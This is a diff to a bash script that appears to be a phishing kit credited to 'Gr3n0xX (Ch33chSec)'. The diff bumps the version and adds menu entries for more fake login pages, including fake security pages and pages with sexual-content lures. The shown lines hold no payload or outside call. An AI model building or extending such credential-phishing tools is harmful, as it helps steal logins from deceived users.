@@ -66,7 +66,7 @@ echo -e "$R ╔╝$W█$R╚══╦═╦══╦╩═╦═╦═╩╝"
 echo -e "$R╔╝$W█████$R║$W█$R║$W██$R║$W██$R║$W█$R║"
 echo -e "$R║$W██████$R║$W█████████$R║\033[00m"
 echo
-printf "      \e[1;97m    Version 1.2 Beta      \e[0m\n"
+printf "      \e[1;97m    Version 1.3 Beta      \e[0m\n"
 printf "\n"
 printf "   \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Tool Created by Gr3n0xX (Ch33chSec)\e[0m\n"
 printf "\n"
@@ -376,7 +376,7 @@ echo -e "$blue
              \n"
 echo
 echo
-printf "      \e[1;97m    Version 1.2 Beta      \e[0m\n"
+printf "      \e[1;97m    Version 1.3 Beta      \e[0m\n"
 printf "\n"
 printf "   \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Tool Created by Gr3n0xX (Ch33chSec)\e[0m\n"
 printf "\n"
@@ -429,6 +429,10 @@ printf " \n"
 printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Create account\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Fake mobile Page\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m Fake Security page\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m05\e[0m\e[1;31m]\e[0m\e[1;93m Fake statics Page\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m06\e[0m\e[1;31m]\e[0m\e[1;93m Fake lana holes Page\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m07\e[0m\e[1;31m]\e[0m\e[1;93m Fake mia khalifa Page\e[0m\n"
 printf "\e[0m\n"
 read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' lol_option
 
@@ -443,6 +447,23 @@ start
 elif [[ $fb_option == 3 || $lol_option == 03 ]]; then
 server="lol"
 start
+
+elif [[ $fb_option == 4 || $lol_option == 04 ]]; then
+server="lol"
+start
+
+elif [[ $fb_option == 5 || $lol_option == 05 ]]; then
+server="lol"
+start
+
+elif [[ $fb_option == 6 || $lol_option == 06 ]]; then
+server="lol"
+start
+
+elif [[ $fb_option == 7 || $lol_option == 07 ]]; then
+server="lol"
+start
+
 
 else
 printf "\n\n  \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
